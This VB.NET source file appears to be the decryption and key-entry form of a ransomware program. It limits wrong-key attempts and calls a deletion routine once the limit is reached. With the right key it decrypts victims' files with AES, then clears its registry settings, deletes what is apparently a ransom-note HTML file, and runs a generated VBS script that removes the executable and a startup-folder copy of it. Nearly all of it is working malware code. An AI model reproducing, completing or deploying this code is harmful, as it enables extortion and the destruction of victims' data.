﻿Imports System
Imports System.IO
Imports System.Security
Imports System.Security.Cryptography
Public Class Form2
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Dim bytKey As Byte()
    Dim bytIV As Byte()
    Private cntAttempts = 0
    Dim h As Object = GetSetting("T", "0", Class1.Settings.Setting)
    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If e.CloseReason = CloseReason.UserClosing Then

            If Label1.Text = "Please Wait..." Or Label1.Text = "Done!" Then
                e.Cancel = True
            End If


        End If
    End Sub


    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            ProgressBar1.Maximum = Class1.Settings.Attempts
            If h = Nothing Then
                SaveSetting("T", "0", Class1.Settings.Setting, cntAttempts)
                cntAttempts = GetSetting("T", "0", Class1.Settings.Setting)
                Label2.Text = cntAttempts & "/" & Class1.Settings.Attempts & " Attempts"
                ProgressBar1.Value = cntAttempts
            Else
                cntAttempts = GetSetting("T", "0", Class1.Settings.Setting)
                Label2.Text = cntAttempts & "/" & Class1.Settings.Attempts & " Attempts"
                ProgressBar1.Value = cntAttempts
            End If
            TextBox2.Text = Class1.Settings.hash
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If check.AES_Decrypt(GetSetting("G", "0", Class1.Settings.Setting), TextBox1.Text) Then
            Label1.Text = "Please Wait..."
            Form1.Timer1.Stop()


            bytKey = CreateKey(TextBox1.Text)
            bytIV = CreateIV(TextBox1.Text)



            Button1.Enabled = False
            TextBox1.Enabled = False
            BackgroundWorker1.WorkerReportsProgress = True
            BackgroundWorker1.WorkerSupportsCancellation = True
            BackgroundWorker1.RunWorkerAsync()


        Else
            MsgBox("Incorrect Key", MsgBoxStyle.Critical)
            TextBox1.Clear()
            If cntAttempts = Class1.Settings.Attempts Then
                Me.Hide()
                Button1.Enabled = False
                TextBox1.Enabled = False
                SaveSetting("D", "0", Class1.Settings.Setting, "OK")
                del.del()
            Else
                cntAttempts += 1
                Label2.Text = cntAttempts & "/" & Class1.Settings.Attempts & " Attempts"
                SaveSetting("T", "0", Class1.Settings.Setting, cntAttempts)
                ProgressBar1.Increment(1)
            End If







        End If


    End Sub



    Private Enum CryptoAction
        ActionDecrypt = 2
    End Enum

    Private Sub EncryptOrDecryptFile(ByVal strInputFile As String, _
                                     ByVal strOutputFile As String, _
                                     ByVal bytKey() As Byte, _
                                     ByVal bytIV() As Byte, _
                                     ByVal Direction As CryptoAction)

        On Error Resume Next
        fsInput = New System.IO.FileStream(strInputFile, FileMode.Open, _
                                           FileAccess.Read)
        fsOutput = New System.IO.FileStream(strOutputFile, FileMode.OpenOrCreate, _
                                            FileAccess.Write)
        fsOutput.SetLength(0)


        Dim bytBuffer(4096) As Byte
        Dim lngBytesProcessed As Long = 0
        Dim lngFileLength As Long = fsInput.Length
        Dim intBytesInCurrentBlock As Integer
        Dim csCryptoStream As CryptoStream

        Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
        Select Case Direction

            Case CryptoAction.ActionDecrypt
                csCryptoStream = New CryptoStream(fsOutput, _
                cspRijndael.CreateDecryptor(bytKey, bytIV), _
                CryptoStreamMode.Write)
        End Select

        While lngBytesProcessed < lngFileLength

            intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)

            csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)

            lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)

        End While
        csCryptoStream.Close()
        fsInput.Close()
        fsOutput.Close()
        If Direction = CryptoAction.ActionDecrypt Then
            Dim fileEncrypted As New FileInfo(strInputFile)
            fileEncrypted.Delete()
        End If
        If Direction = CryptoAction.ActionDecrypt Then
            Dim fileDelete As New FileInfo(strInputFile)
            fileDelete.Delete()
        End If
    End Sub
    Private Function CreateKey(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytKey(31) As Byte
        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next
        Return bytKey
    End Function
    Private Function CreateIV(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytIV(15) As Byte
        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next
        Return bytIV
    End Function


    Private Sub BackgroundWorker1_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork

        On Error Resume Next




        Button1.Enabled = False



        Dim count As Integer = Form4.listenc.Count
        Me.Text = "Decryption : Working * " & count
        For Each filename In Form4.listenc
            If IO.File.Exists(filename) Then
                EncryptOrDecryptFile(filename, filename.Replace(Class1.Settings.exs, ""), _
        bytKey, bytIV, CryptoAction.ActionDecrypt)
                count = count - 1
                Me.Text = "Decryption : Working * " & count
            End If

        Next
        Form4.listenc.Clear()
        SaveSetting("P", "0", Class1.Settings.Setting, "")
        SaveSetting("H", "0", Class1.Settings.Setting, "") ' clear old Setting
        SaveSetting("M", "0", Class1.Settings.Setting, "")
        SaveSetting("S", "0", Class1.Settings.Setting, "")
        SaveSetting("X", "0", Class1.Settings.Setting, "")
        SaveSetting("D", "0", Class1.Settings.Setting, "")
        SaveSetting("T", "0", Class1.Settings.Setting, "")
        SaveSetting("G", "0", Class1.Settings.Setting, "")
        SaveSetting("F", "0", Class1.Settings.Setting, "")
        SaveSetting("C", "0", Class1.Settings.Setting, "")

        Label1.Text = "Done!"

        If IO.File.Exists(Class1.Settings.html) Then
            IO.File.Delete(Class1.Settings.html)
        End If
        MsgBox("Decryption completed successfully!", MsgBoxStyle.Information)

        Dim stb As String = My.Resources.del
        Dim pathh As String = IO.Path.GetTempPath & "del.vbs"
        stb = stb.Replace("%path%", Application.ExecutablePath)
        stb = stb.Replace("%startup%", Environment.GetFolderPath(7) & "\" & Class1.Settings.mute & ".exe")
        Dim objWriter As New System.IO.StreamWriter(pathh, False)
        objWriter.WriteLine(stb)
        objWriter.Close()
        Process.Start(pathh)
        End
    End Sub


    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Clipboard.SetText(TextBox2.Text)
            MessageBox.Show("Copied To Clipboard")
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
End Class